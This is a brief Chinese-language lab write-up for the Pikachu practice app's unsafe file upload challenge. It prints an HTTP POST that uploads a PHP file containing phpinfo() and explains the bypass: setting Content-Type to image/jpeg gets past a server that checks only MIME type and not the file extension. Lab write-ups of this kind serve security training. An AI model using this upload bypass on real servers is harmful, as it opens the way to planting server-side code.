

1. 先上傳一個 php 會跳出

`上传的图片只能是jpg,jpeg,png格式的！`

這段文字在JS 找不到，所以應該是後端判斷。


這題就是判斷(MIME type)  Content-Type: 





```http=
POST /vul/unsafeupload/servercheck.php HTTP/1.1
Host: pika
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------157642763230063491853258095968
Content-Length: 382
Origin: http://pika
Connection: close
Referer: http://pika/vul/unsafeupload/servercheck.php
Upgrade-Insecure-Requests: 1

-----------------------------157642763230063491853258095968
Content-Disposition: form-data; name="uploadfile"; filename="test.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------157642763230063491853258095968
Content-Disposition: form-data; name="submit"

开始上传
-----------------------------157642763230063491853258095968--


```


這題是叫你先上傳php ，然後修改Content-Type: image/jpeg

伺服器只判斷Content-Type 沒判斷後綴

所以很簡單繞過。





